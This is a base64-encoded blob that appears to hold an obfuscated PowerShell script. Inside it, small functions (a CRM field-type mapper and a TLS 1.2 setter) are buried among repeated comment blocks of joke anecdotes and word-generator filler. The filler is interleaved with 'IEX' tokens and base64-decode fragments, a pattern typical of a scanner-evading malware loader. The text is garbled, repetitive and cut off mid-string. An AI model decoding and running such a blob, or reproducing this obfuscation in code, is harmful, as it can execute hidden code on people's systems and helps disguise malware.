JjZSBPbmUgdGltZSBJIGF0ZSAyNiBjaG9jb2xhdGUgY2hpcCBpKCkgYmVjYXVzZSBJIHdhcyBtYWQgYXQgbXkgbGl0dGxlIGwoKSBhbmQgZGlkbnQgd2FudCBoZXIgdG8gaGF2ZSBhbnkuIEkgcHVrZWQgYWxsIG92ZXIgdGhlIHBsYWNlLuKAnSBTb3VyY2UjPgo8I+KAnFRoaXMgb25lIHRpbWUgaW4gOXRoIGdyYWRlLCBteSBmcmllbmQgYW5kIEkgZGVjaWRlZCB0byB1c2UgdGhlIG4oKSBJRVggYSBiaWcgdGVzdC4gSSBkaWRudCBnaXZlIGEgc2h0IGFib3V0IHRoaXMgdGVzdCwgc28gSSBwbGF5ZnVsbHkgcHJldGVuZGVkIHRvIGdldCByZWFsbHkgdXBzZXQuIEluIGF0dGVtcHQgdG8gYmUgb2J2aW91c2x5IG5vdCBtYWQsIEkga2ljayBhIHBpcGUgb24gdGhlIHRvcCBvZiBhIHVyaW5hbCwgYWNjaWRlbnRhbGx5IGtub2NraW5nIGl0IG91dCBvZiB0aGUgdG9wIG9mIHRoZSB0b2lsZXQuIEl0IHdhcyBzdGlsbCBjb25uZWN0ZWQgdG8gdGhlIHdhbGwgaG93ZXZlci4gVHVybnMgb3V0LCBJIGNvdWxkIGFpbSB0aGUgcGlwZSBpbiBkaWZmZXJlbnQgZGlyZWN0aW9ucy4gU28sIEkgYWltZWQgaXQgc3RyYWlnaHQgb3V0IGFuZCB0cmllZCBmbHVzaGluZyB0aGUgdG9pbGV0LiBUaGUgd2F0ZXIgTEFVTkNIRUQgT1VUIE9GIFRIRSBQSVBFIEFORCBISVQgVEhFIFdBTEwgT04gVEhFIE9USEVSIFNJREUgT0YgVEhFIFJPT00uIE15IGZyaWVuZCBhbmQgSSB3ZXJlIGZsaXBwaW5nIG91dC4gVGhpcyBnYXZlIG1lIGEgYnJpZ2h0IGlkZWEuIEkgcHV0IHRoZSBwaXBlIGluIHN1Y2ggYSBzcG90IHdoZXJlIGl0IGxvb2tlZCBsaWtlIGl0IHdhcyBwcmlvciB0byB1cyBraWNraW5nIHRoZSBmKmsgb3V0IG9mIGl0LiBIb3dldmVyLCBJIHB1bGxlZCBpdCBvdXQgZXZlciBzbyBzbGlnaHRseSBzbyB3YXRlciB3b3VsZCBzcHJheSBvdXIgbmV4dCB1bnN1c3BlY3RpbmcgdmljdGltLiBJIHJlbWVtYmVyIGtpZHMgY29taW5nIG91dCBvZiB0aGUgYmF0aHJvb20gZHJlbmNoZWQgaW4gd2F0ZXIsIGN1c3NpbmcgdGhlaXIgYnJhaW5zIG91dCBiZWNhdXNlIHRoZXkgd2VyZSBzbyBtYWQuIEdvb2QgdGltZXMu4oCdIz4KZnVuY3Rpb24gdSB7CiAgICBQQVJBTSgKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeT0kdHJ1ZSldCiAgICAgICAgW29iamVjdF0kVmFsdWUKICAgICkKCiAgICAkdmFsdWVUeXBlVG9Dcm1UeXBlTWFwcGluZyA9IEB7CiAgICAgICAgIkJvb2xlYW4iID0gW01pY3Jvc29mdC5Ycm0uVG9vbGluZy5Db25uZWN0b3IuQ3JtRmllbGRUeXBlXTo6Q3JtQm9vbGVhbjsKICAgICAgICAiRGF0ZVRpbWUiID0gW01pY3Jvc29mdC5Ycm0uVG9vbGluZy5Db25uZWN0b3IuQ3JtRmllbGRUeXBlXTo6Q3JtRGF0ZVRpbWU7CiAgICAgICAgIkRlY2ltYWwiID0gW01pY3Jvc29mdC5Ycm0uVG9vbGluZy5Db25uZWN0b3IuQ3JtRmllbGRUeXBlXTo6Q3JtRGVjaW1hbDsKICAgICAgICAiU2luZ2xlIiA9IFtNaWNyb3NvZnQuWHJtLlRvb2xpbmcuQ29ubmVjdG9yLkNybUZpZWxkVHlwZV06OkNybUZsb2F0OwogICAgICAgICJNb25leSIgPSBbTWljcm9zb2Z0LlhybS5Ub29saW5nLkNvbm5lY3Rvci5Dcm1GaWVsZFR5cGVdOjpSYXc7CiAgICAgICAgIkludDMyIiA9IFtNaWNyb3NvZnQuWHJtLlRvb2xpbmcuQ29ubmVjdG9yLkNybUZpZWxkVHlwZV06OkNybU51bWJlcjsKICAgICAgICAiRW50aXR5UmVmZXJlbmNlIiA9IFtNaWNyb3NvZnQuWHJtLlRvb2xpbmcuQ29ubmVjdG9yLkNybUZpZWxkVHlwZV06OlJhdzsKICAgICAgICAiT3B0aW9uU2V0VmFsdWUiID0gW01pY3Jvc29mdC5Ycm0uVG9vbGluZy5Db25uZWN0b3IuQ3JtRmllbGRUeXBlXTo6UmF3OwogICAgICAgICJTdHJpbmciID0gW01pY3Jvc29mdC5Ycm0uVG9vbGluZy5Db25uZWN0b3IuQ3JtRmllbGRUeXBlXTo6U3RyaW5nOwogICAgICAgICJHdWlkIiA9ICBbTWljcm9zb2Z0LlhybS5Ub29saW5nLkNvbm5lY3Rvci5Dcm1GaWVsZFR5cGVdOjpVbmlxdWVJZGVudGlmaWVyOwogICAgfQoKICAgICMgZGVmYXVsdCBpcyBSQVcKICAgICRjcm1EYXRhVHlwZSA9IFtNaWNyb3NvZnQuWHJtLlRvb2xpbmcuQ29ubmVjdG9yLkNybUZpZWxkVHlwZV06OlJhdwoKICAgIGlmKCRWYWx1ZSAtbmUgJG51bGwpIHsKCiAgICAgICAgJHZhbHVlVHlwZSA9ICRWYWx1ZS5HZXRUeXBlKCkuTmFtZQogICAgICAgIAogICAgICAgIGlmKCR2YWx1ZVR5cGVUb0NybVR5cGVNYXBwaW5nLkNvbnRhaW5zS2V5KCR2YWx1ZVR5cGUpKSB7CiAgICAgICAgICAgICRjcm1EYXRhVHlwZSA9ICR2YWx1ZVR5cGVUb0NybVR5cGVNYXBwaW5nWyR2YWx1ZVR5cGVdCiAgICAgICAgfSAgIAogICAgfQoKICAgIHJldHVybiAkY3JtRGF0YXR5cGUKfQo8Iz4+ClNwPWVsbGluZyBhbmQgYygpClRoaXMgdG9vbCBjYW4gYmUgYW4gZXhjZWxsZW50IHdheSB0byBpbXByb3ZlIGMoKSBvciBwcmFjdGljZSBmb3IgcigpIGJlZXMuIElmIGFuIHEoKSB3b3JkIG8oKSwgcCgpIHVwIHRoZSBtZWFuaW5nIHdpbGwgaGVscCBzdHVkZW50cyBpbmNyZWFzZSB0aGUgbnVtYmVyIG9mIHdvcmRzIHRoZXkga25vdy4gV29ya2luZyB3aXRoIGEgcGFydG5lciwgc3R1ZGVudHMgY2FuIHRlc3QgZWFjaCBvdGhlciBvbiB0aGUgcigpIGZvciB0aGUgcmFuZG9taXplZCB3b3JkcyBtKClkLgoKTmFtZSBJbnNwaXJhdGlvbgpJZiB5b3UgbmVlZCB0byBjcmVhdGUgYSBuYW1lIGZvciBhIHByb2R1Y3QsIGFuIGV2ZW50LCBhIGJhbmQgb3IgZm9yIGFueXRoaW5nIGVsc2UsIHRoaXMgdG9vbCBjYW4gYmUgcXVpdGUgaGVscGZ1bC4gQXMgeW91IGNvbnNpZGVyIG5hbWVzLCBtKCkgYSBudW1iZXIgb2YgcmFuZG9tIHdvcmRzIGFuZCBzZWUgaG93IHRoZXkgaW1wYWN0IHdoYXQgeW91IGhhdmUgYWxyZWFkeSBjb21lIHVwIHdpdGguIElucHV0dGluZyB1bmlxdWUgd29yZHMgeW91IG1heSBub3QgaGF2ZSBjb25zaWRlcmVkIGNhbiBzcGFyayBhZGRpdGlvbmFsIGNyZWF0aXZpdHkgdG8gZXZlbnR1YWxseSBoZWxwIHlvdSBwcm9kdWNlIHRoZSBwZXJmZWN0IG5hbWUgZm9yIHlvdXIgcHJvamVjdC4gSWYgeW91J3JlIHAoKSBmb3IgZ29vZCBjaGFyYWN0ZXIgbmFtZXMgb3IgYmFieSBuYW1lcywgeW91IG1pZ2h0IGJlIGludGVyZXN0ZWQgaW4gb3VyIHJhbmRvbSBuYW1lIGdlbmVyYXRvci4KClRoZSBhYm92ZSBsaXN0IGlzIG5vdCBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKC4gVGhlcmUgYXJlIGxpdGVyYWxseSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCBvZiB3YXlzIHRoZSBSYW5kb20gV29yZCBHZW5lcmF0b3IgY2FuIGJlIHVzZWQuIFBsZWFzZSBmZWVsIGZyZWUgdG8gc2hhcmUgdGhlIHdheSB5b3UgdXNlIHRoaXMgdG9vbCwgYW5kIHdlIGFsd2F5cyB3ZWxjb21lIHN1Z2dlc3Rpb25zIG9uIGhvdyB3ZSBjYW4gaW1wcm92ZSBpdCB0byBzZXJ2ZSB5b3UgYmV0dGVyLiBXZSBhcmUgYWxzbyBpbnRlcmVzdGVkIGluIG5ldyB3b3JkIGdlbmVyYXRvcnMgeW91J2QgYmUgaW50ZXJlc3RlZCBpbiB1cyBjcmVhdGluZy4gTWFueSBvZiB0aGUgdG9vbHMgb24gdGhpcyB3ZWJzaXRlIGNhbWUgZnJvbSBpZGVhcyBmcm9tIHBlb3BsZSBsaWtlIHlvdSB3aG8gY29udGFjdGVkIHVzLiBQbGVhc2UgdGFrZSB0aGUgdGltZSB0byBleHBsb3JlIHRoZSBvdGhlciByYW5kb20gZ2VuZXJhdG9ycyB3ZSBoYXZlIGF2YWlsCgojPjwjPuKAnFRoaXMgb25lIHRpbWUgaW4gOXRoIGdyYWRlLCBteSBmcmllbmQgYW5kIEkgZGVjaWRlZCB0byB1c2UgdGhlIG4oKSBJRVggYSBiaWcgdGVzdC4gSSBkaWRudCBnaXZlIGEgc2h0IGFib3V0IHRoaXMgdGVzdCwgc28gSSBwbGF5ZnVsbHkgcHJldGVuZGVkIHRvIGdldCByZWFsbHkgdXBzZXQuIEluIGF0dGVtcHQgdG8gYmUgb2J2aW91c2x5IG5vdCBtYWQsIEkga2ljayBhIHBpcGUgb24gdGhlIHRvcCBvZiBhIHVyaW5hbCwgYWNjaWRlbnRhbGx5IGtub2NraW5nIGl0IG91dCBvZiB0aGUgdG9wIG9mIHRoZSB0b2lsZXQuIEl0IHdhcyBzdGlsbCBjb25uZWN0ZWQgdG8gdGhlIHdhbGwgaG93ZXZlci4gVHVybnMgb3V0LCBJIGNvdWxkIGFpbSB0aGUgcGlwZSBpbiBkaWZmZXJlbnQgZGlyZWN0aW9ucy4gU28sIEkgYWltZWQgaXQgc3RyYWlnaHQgb3V0IGFuZCB0cmllZCBmbHVzaGluZyB0aGUgdG9pbGV0LiBUaGUgd2F0ZXIgTEFVTkNIRUQgT1VUIE9GIFRIRSBQSVBFIEFORCBISVQgVEhFIFdBTEwgT04gVEhFIE9USEVSIFNJREUgT0YgVEhFIFJPT00uIE15IGZyaWVuZCBhbmQgSSB3ZXJlIGZsaXBwaW5nIG91dC4gVGhpcyBnYXZlIG1lIGEgYnJpZ2h0IGlkZWEuIEkgcHV0IHRoZSBwaXBlIGluIHN1Y2ggYSBzcG90IHdoZXJlIGl0IGxvb2tlZCBsaWtlIGl0IHdhcyBwcmlvciB0byB1cyBraWNraW5nIHRoZSBmKmsgb3V0IG9mIGl0LiBIb3dldmVyLCBJIHB1bGxlZCBpdCBvdXQgZXZlciBzbyBzbGlnaHRseSBzbyB3YXRlciB3b3VsZCBzcHJheSBvdXIgbmV4dCB1bnN1c3BlY3RpbmcgdmljdGltLiBJIHJlbWVtYmVyIGtpZHMgY29taW5nIG91dCBvZiB0aGUgYmF0aHJvb20gZHJlbmNoZWQgaW4gd2F0ZXIsIGN1c3NpbmcgdGhlaXIgYnJhaW5zIG91dCBiZWNhdXNlIHRoZXkgd2VyZSBzbyBtYWQuIEdvb2QgdGltZXMu4oCdIz4KPCM+4oCcVGhpcyBvbmUgdGltZSBpbiA5dGggZ3JhZGUsIG15IGZyaWVuZCBhbmQgSSBkZWNpZGVkIHRvIHVzZSB0aGUgbigpIElFWCBhIGJpZyB0ZXN0LiBJIGRpZG50IGdpdmUgYSBzaHQgYWJvdXQgdGhpcyB0ZXN0LCBzbyBJIHBsYXlmdWxseSBwcmV0ZW5kZWQgdG8gZ2V0IHJlYWxseSB1cHNldC4gSW4gYXR0ZW1wdCB0byBiZSBvYnZpb3VzbHkgbm90IG1hZCwgSSBraWNrIGEgcGlwZSBvbiB0aGUgdG9wIG9mIGEgdXJpbmFsLCBhY2NpZGVudGFsbHkga25vY2tpbmcgaXQgb3V0IG9mIHRoZSB0b3Agb2YgdGhlIHRvaWxldC4gSXQgd2FzIHN0aWxsIGNvbm5lY3RlZCB0byB0aGUgd2FsbCBob3dldmVyLiBUdXJucyBvdXQsIEkgY291bGQgYWltIHRoZSBwaXBlIGluIGRpZmZlcmVudCBkaXJlY3Rpb25zLiBTbywgSSBhaW1lZCBpdCBzdHJhaWdodCBvdXQgYW5kIHRyaWVkIGZsdXNoaW5nIHRoZSB0b2lsZXQuIFRoZSB3YXRlciBMQVVOQ0hFRCBPVVQgT0YgVEhFIFBJUEUgQU5EIEhJVCBUSEUgV0FMTCBPTiBUSEUgT1RIRVIgU0lERSBPRiBUSEUgUk9PTS4gTXkgZnJpZW5kIGFuZCBJIHdlcmUgZmxpcHBpbmcgb3V0LiBUaGlzIGdhdmUgbWUgYSBicmlnaHQgaWRlYS4gSSBwdXQgdGhlIHBpcGUgaW4gc3VjaCBhIHNwb3Qgd2hlcmUgaXQgbG9va2VkIGxpa2UgaXQgd2FzIHByaW9yIHRvIHVzIGtpY2tpbmcgdGhlIGYqayBvdXQgb2YgaXQuIEhvd2V2ZXIsIEkgcHVsbGVkIGl0IG91dCBldmVyIHNvIHNsaWdodGx5IHNvIHdhdGVyIHdvdWxkIHNwcmF5IG91ciBuZXh0IHVuc3VzcGVjdGluZyB2aWN0aW0uIEkgcmVtZW1iZXIga2lkcyBjb21pbmcgb3V0IG9mIHRoZSBiYXRocm9vbSBkcmVuY2hlZCBpbiB3YXRlciwgY3Vzc2luZyB0aGVpciBicmFpbnMgb3V0IGJlY2F1c2UgdGhleSB3ZXJlIHNvIG1hZC4gR29vZCB0aW1lcy7igJ0jPgo8Iz7igJxJIHdhcyBhdCBhIHN3YW5rIGJhciBmb3IgYSB3b3JrIFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoLCBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCBzb21lIGdyYWQgc3R1ZGVudHMgd2UgaigpIGZvciBhbiBmKCkgcHJvZ3JhbS4gQWZ0ZXIgd2UgaGFkIGFsbCBoYWQgaygpIGRyaW5rcywgb25lIG9mIHRoZSBzdHVkZW50cyBzYWlkIHRoZXkgZG9udCBsaWtlIHNtb2tlcyBiZWNhdXNlIHRoZXkgdGFzdGUgbGlrZSBhLiBNeSBib3NzIHJlcGxpZWQsIG1heWJlIHlvdSBoYXZlbnQgaGFkIGdvb2Qgc21va2VzLiBTbyBJIGN1dCBpbiwgbWF5YmUgeW91IGhhdmVudCBoYWQgZ29vZCBhLiBJIHdhcyBhc2tlZCB0byBsZWF2ZS7igJ1Tb3VyY2UjPgo8I1RoYXRzIERlZGljYXRpb25Tb3VyY2UgT25lIHRpbWUgSSBhdGUgMjYgY2hvY29sYXRlIGNoaXAgaSgpIGJlY2F1c2UgSSB3YXMgbWFkIGF0IG15IGxpdHRsZSBsKCkgYW5kIGRpZG50IHdhbnQgaGVyIHRvIGhhdmUgYW55LiBJIHB1a2VkIGFsbCBvdmVyIHRoZSBwbGFjZS7igJ0gU291cmNlIz4KPCPigJxUaGlzIG9uZSB0aW1lIGluIDl0aCBncmFkZSwgbXkgZnJpZW5kIGFuZCBJIGRlY2lkZWQgdG8gdXNlIHRoZSBuKCkgSUVYIGEgYmlnIHRlc3QuIEkgZGlkbnQgZ2l2ZSBhIHNodCBhYm91dCB0aGlzIHRlc3QsIHNvIEkgcGxheWZ1bGx5IHByZXRlbmRlZCB0byBnZXQgcmVhbGx5IHVwc2V0LiBJbiBhdHRlbXB0IHRvIGJlIG9idmlvdXNseSBub3QgbWFkLCBJIGtpY2sgYSBwaXBlIG9uIHRoZSB0b3Agb2YgYSB1cmluYWwsIGFjY2lkZW50YWxseSBrbm9ja2luZyBpdCBvdXQgb2YgdGhlIHRvcCBvZiB0aGUgdG9pbGV0LiBJdCB3YXMgc3RpbGwgY29ubmVjdGVkIHRvIHRoZSB3YWxsIGhvd2V2ZXIuIFR1cm5zIG91dCwgSSBjb3VsZCBhaW0gdGhlIHBpcGUgaW4gZGlmZmVyZW50IGRpcmVjdGlvbnMuIFNvLCBJIGFpbWVkIGl0IHN0cmFpZ2h0IG91dCBhbmQgdHJpZWQgZmx1c2hpbmcgdGhlIHRvaWxldC4gVGhlIHdhdGVyIExBVU5DSEVEIE9VVCBPRiBUSEUgUElQRSBBTkQgSElUIFRIRSBXQUxMIE9OIFRIRSBPVEhFUiBTSURFIE9GIFRIRSBST09NLiBNeSBmcmllbmQgYW5kIEkgd2VyZSBmbGlwcGluZyBvdXQuIFRoaXMgZ2F2ZSBtZSBhIGJyaWdodCBpZGVhLiBJIHB1dCB0aGUgcGlwZSBpbiBzdWNoIGEgc3BvdCB3aGVyZSBpdCBsb29rZWQgbGlrZSBpdCB3YXMgcHJpb3IgdG8gdXMga2lja2luZyB0aGUgZiprIG91dCBvZiBpdC4gSG93ZXZlciwgSSBwdWxsZWQgaXQgb3V0IGV2ZXIgc28gc2xpZ2h0bHkgc28gd2F0ZXIgd291bGQgc3ByYXkgb3VyIG5leHQgdW5zdXNwZWN0aW5nIHZpY3RpbS4gSSByZW1lbWJlciBraWRzIGNvbWluZyBvdXQgb2YgdGhlIGJhdGhyb29tIGRyZW5jaGVkIGluIHdhdGVyLCBjdXNzaW5nIHRoZWlyIGJyYWlucyBvdXQgYmVjYXVzZSB0aGV5IHdlcmUgc28gbWFkLiBHb29kIHRpbWVzLuKAnSM+CmZ1bmN0aW9uIHYgewoJI2J5IGRlZmF1bHQgUG93ZXJTaGVsbCB3aWxsIHNob3cgU3NsMywgVGxzIC0gc2luY2UgU1NMMyBpcyBub3QgZGVzaXJhYmxlIHdlIHdpbGwgZHJvcCBpdCBhbmQgdXNlIFRscyArIFRsczEyCglbU3lzdGVtLk5ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtTeXN0ZW0uTmV0LlNlY3VyaXR5UHJvdG9jb2xUeXBlXTo6VGxzIC1ib3IgW1N5c3RlbS5OZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMgp9CjwjPj4KU3A9ZWxsaW5nIGFuZCBjKCkKVGhpcyB0b29sIGNhbiBiZSBhbiBleGNlbGxlbnQgd2F5IHRvIGltcHJvdmUgYygpIG9yIHByYWN0aWNlIGZvciByKCkgYmVlcy4gSWYgYW4gcSgpIHdvcmQgbygpLCBwKCkgdXAgdGhlIG1lYW5pbmcgd2lsbCBoZWxwIHN0dWRlbnRzIGluY3JlYXNlIHRoZSBudW1iZXIgb2Ygd29yZHMgdGhleSBrbm93LiBXb3JraW5nIHdpdGggYSBwYXJ0bmVyLCBzdHVkZW50cyBjYW4gdGVzdCBlYWNoIG90aGVyIG9uIHRoZSByKCkgZm9yIHRoZSByYW5kb21pemVkIHdvcmRzIG0oKWQuCgpOYW1lIEluc3BpcmF0aW9uCklmIHlvdSBuZWVkIHRvIGNyZWF0ZSBhIG5hbWUgZm9yIGEgcHJvZHVjdCwgYW4gZXZlbnQsIGEgYmFuZCBvciBmb3IgYW55dGhpbmcgZWxzZSwgdGhpcyB0b29sIGNhbiBiZSBxdWl0ZSBoZWxwZnVsLiBBcyB5b3UgY29uc2lkZXIgbmFtZXMsIG0oKSBhIG51bWJlciBvZiByYW5kb20gd29yZHMgYW5kIHNlZSBob3cgdGhleSBpbXBhY3Qgd2hhdCB5b3UgaGF2ZSBhbHJlYWR5IGNvbWUgdXAgd2l0aC4gSW5wdXR0aW5nIHVuaXF1ZSB3b3JkcyB5b3UgbWF5IG5vdCBoYXZlIGNvbnNpZGVyZWQgY2FuIHNwYXJrIGFkZGl0aW9uYWwgY3JlYXRpdml0eSB0byBldmVudHVhbGx5IGhlbHAgeW91IHByb2R1Y2UgdGhlIHBlcmZlY3QgbmFtZSBmb3IgeW91ciBwcm9qZWN0LiBJZiB5b3UncmUgcCgpIGZvciBnb29kIGNoYXJhY3RlciBuYW1lcyBvciBiYWJ5IG5hbWVzLCB5b3UgbWlnaHQgYmUgaW50ZXJlc3RlZCBpbiBvdXIgcmFuZG9tIG5hbWUgZ2VuZXJhdG9yLgoKVGhlIGFib3ZlIGxpc3QgaXMgbm90IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoLiBUaGVyZSBhcmUgbGl0ZXJhbGx5IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoIG9mIHdheXMgdGhlIFJhbmRvbSBXb3JkIEdlbmVyYXRvciBjYW4gYmUgdXNlZC4gUGxlYXNlIGZlZWwgZnJlZSB0byBzaGFyZSB0aGUgd2F5IHlvdSB1c2UgdGhpcyB0b29sLCBhbmQgd2UgYWx3YXlzIHdlbGNvbWUgc3VnZ2VzdGlvbnMgb24gaG93IHdlIGNhbiBpbXByb3ZlIGl0IHRvIHNlcnZlIHlvdSBiZXR0ZXIuIFdlIGFyZSBhbHNvIGludGVyZXN0ZWQgaW4gbmV3IHdvcmQgZ2VuZXJhdG9ycyB5b3UnZCBiZSBpbnRlcmVzdGVkIGluIHVzIGNyZWF0aW5nLiBNYW55IG9mIHRoZSB0b29scyBvbiB0aGlzIHdlYnNpdGUgY2FtZSBmcm9tIGlkZWFzIGZyb20gcGVvcGxlIGxpa2UgeW91IHdobyBjb250YWN0ZWQgdXMuIFBsZWFzZSB0YWtlIHRoZSB0aW1lIHRvIGV4cGxvcmUgdGhlIG90aGVyIHJhbmRvbSBnZW5lcmF0b3JzIHdlIGhhdmUgYXZhaWwKCiM+PCM+4oCcVGhpcyBvbmUgdGltZSBpbiA5dGggZ3JhZGUsIG15IGZyaWVuZCBhbmQgSSBkZWNpZGVkIHRvIHVzZSB0aGUgbigpIElFWCBhIGJpZyB0ZXN0LiBJIGRpZG50IGdpdmUgYSBzaHQgYWJvdXQgdGhpcyB0ZXN0LCBzbyBJIHBsYXlmdWxseSBwcmV0ZW5kZWQgdG8gZ2V0IHJlYWxseSB1cHNldC4gSW4gYXR0ZW1wdCB0byBiZSBvYnZpb3VzbHkgbm90IG1hZCwgSSBraWNrIGEgcGlwZSBvbiB0aGUgdG9wIG9mIGEgdXJpbmFsLCBhY2NpZGVudGFsbHkga25vY2tpbmcgaXQgb3V0IG9mIHRoZSB0b3Agb2YgdGhlIHRvaWxldC4gSXQgd2FzIHN0aWxsIGNvbm5lY3RlZCB0byB0aGUgd2FsbCBob3dldmVyLiBUdXJucyBvdXQsIEkgY291bGQgYWltIHRoZSBwaXBlIGluIGRpZmZlcmVudCBkaXJlY3Rpb25zLiBTbywgSSBhaW1lZCBpdCBzdHJhaWdodCBvdXQgYW5kIHRyaWVkIGZsdXNoaW5nIHRoZSB0b2lsZXQuIFRoZSB3YXRlciBMQVVOQ0hFRCBPVVQgT0YgVEhFIFBJUEUgQU5EIEhJVCBUSEUgV0FMTCBPTiBUSEUgT1RIRVIgU0lERSBPRiBUSEUgUk9PTS4gTXkgZnJpZW5kIGFuZCBJIHdlcmUgZmxpcHBpbmcgb3V0LiBUaGlzIGdhdmUgbWUgYSBicmlnaHQgaWRlYS4gSSBwdXQgdGhlIHBpcGUgaW4gc3VjaCBhIHNwb3Qgd2hlcmUgaXQgbG9va2VkIGxpa2UgaXQgd2FzIHByaW9yIHRvIHVzIGtpY2tpbmcgdGhlIGYqayBvdXQgb2YgaXQuIEhvd2V2ZXIsIEkgcHVsbGVkIGl0IG91dCBldmVyIHNvIHNsaWdodGx5IHNvIHdhdGVyIHdvdWxkIHNwcmF5IG91ciBuZXh0IHVuc3VzcGVjdGluZyB2aWN0aW0uIEkgcmVtZW1iZXIga2lkcyBjb21pbmcgb3V0IG9mIHRoZSBiYXRocm9vbSBkcmVuY2hlZCBpbiB3YXRlciwgY3Vzc2luZyB0aGVpciBicmFpbnMgb3V0IGJlY2F1c2UgdGhleSB3ZXJlIHNvIG1hZC4gR29vZCB0aW1lcy7igJ0jPgo8Iz7igJxUaGlzIG9uZSB0aW1lIGluIDl0aCBncmFkZSwgbXkgZnJpZW5kIGFuZCBJIGRlY2lkZWQgdG8gdXNlIHRoZSBuKCkgSUVYIGEgYmlnIHRlc3QuIEkgZGlkbnQgZ2l2ZSBhIHNodCBhYm91dCB0aGlzIHRlc3QsIHNvIEkgcGxheWZ1bGx5IHByZXRlbmRlZCB0byBnZXQgcmVhbGx5IHVwc2V0LiBJbiBhdHRlbXB0IHRvIGJlIG9idmlvdXNseSBub3QgbWFkLCBJIGtpY2sgYSBwaXBlIG9uIHRoZSB0b3Agb2YgYSB1cmluYWwsIGFjY2lkZW50YWxseSBrbm9ja2luZyBpdCBvdXQgb2YgdGhlIHRvcCBvZiB0aGUgdG9pbGV0LiBJdCB3YXMgc3RpbGwgY29ubmVjdGVkIHRvIHRoZSB3YWxsIGhvd2V2ZXIuIFR1cm5zIG91dCwgSSBjb3VsZCBhaW0gdGhlIHBpcGUgaW4gZGlmZmVyZW50IGRpcmVjdGlvbnMuIFNvLCBJIGFpbWVkIGl0IHN0cmFpZ2h0IG91dCBhbmQgdHJpZWQgZmx1c2hpbmcgdGhlIHRvaWxldC4gVGhlIHdhdGVyIExBVU5DSEVEIE9VVCBPRiBUSEUgUElQRSBBTkQgSElUIFRIRSBXQUxMIE9OIFRIRSBPVEhFUiBTSURFIE9GIFRIRSBST09NLiBNeSBmcmllbmQgYW5kIEkgd2VyZSBmbGlwcGluZyBvdXQuIFRoaXMgZ2F2ZSBtZSBhIGJyaWdodCBpZGVhLiBJIHB1dCB0aGUgcGlwZSBpbiBzdWNoIGEgc3BvdCB3aGVyZSBpdCBsb29rZWQgbGlrZSBpdCB3YXMgcHJpb3IgdG8gdXMga2lja2luZyB0aGUgZiprIG91dCBvZiBpdC4gSG93ZXZlciwgSSBwdWxsZWQgaXQgb3V0IGV2ZXIgc28gc2xpZ2h0bHkgc28gd2F0ZXIgd291bGQgc3ByYXkgb3VyIG5leHQgdW5zdXNwZWN0aW5nIHZpY3RpbS4gSSByZW1lbWJlciBraWRzIGNvbWluZyBvdXQgb2YgdGhlIGJhdGhyb29tIGRyZW5jaGVkIGluIHdhdGVyLCBjdXNzaW5nIHRoZWlyIGJyYWlucyBvdXQgYmVjYXVzZSB0aGV5IHdlcmUgc28gbWFkLiBHb29kIHRpbWVzLuKAnSM+CjwjPuKAnEkgd2FzIGF0IGEgc3dhbmsgYmFyIGZvciBhIHdvcmsgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygsIFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoIHNvbWUgZ3JhZCBzdHVkZW50cyB3ZSBqKCkgZm9yIGFuIGYoKSBwcm9ncmFtLiBBZnRlciB3ZSBoYWQgYWxsIGhhZCBrKCkgZHJpbmtzLCBvbmUgb2YgdGhlIHN0dWRlbnRzIHNhaWQgdGhleSBkb250IGxpa2Ugc21va2VzIGJlY2F1c2UgdGhleSB0YXN0ZSBsaWtlIGEuIE15IGJvc3MgcmVwbGllZCwgbWF5YmUgeW91IGhhdmVudCBoYWQgZ29vZCBzbW9rZXMuIFNvIEkgY3V0IGluLCBtYXliZSB5b3UgaGF2ZW50IGhhZCBnb29kIGEuIEkgd2FzIGFza2VkIHRvIGxlYXZlLuKAnVNvdXJjZSM+CjwjVGhhdHMgRGVkaWNhdGlvblNvdXJjZSBPbmUgdGltZSBJIGF0ZSAyNiBjaG9jb2xhdGUgY2hpcCBpKCkgYmVjYXVzZSBJIHdhcyBtYWQgYXQgbXkgbGl0dGxlIGwoKSBhbmQgZGlkbnQgd2FudCBoZXIgdG8gaGF2ZSBhbnkuIEkgcHVrZWQgYWxsIG92ZXIgdGhlIHBsYWNlLuKAnSBTb3VyY2UjPgo8I+KAnFRoaXMgb25lIHRpbWUgaW4gOXRoIGdyYWRlLCBteSBmcmllbmQgYW5kIEkgZGVjaWRlZCB0byB1c2UgdGhlIG4oKSBJRVggYSBiaWcgdGVzdC4gSSBkaWRudCBnaXZlIGEgc2h0IGFib3V0IHRoaXMgdGVzdCwgc28gSSBwbGF5ZnVsbHkgcHJldGVuZGVkIHRvIGdldCByZWFsbHkgdXBzZXQuIEluIGF0dGVtcHQgdG8gYmUgb2J2aW91c2x5IG5vdCBtYWQsIEkga2ljayBhIHBpcGUgb24gdGhlIHRvcCBvZiBhIHVyaW5hbCwgYWNjaWRlbnRhbGx5IGtub2NraW5nIGl0IG91dCBvZiB0aGUgdG9wIG9mIHRoZSB0b2lsZXQuIEl0IHdhcyBzdGlsbCBjb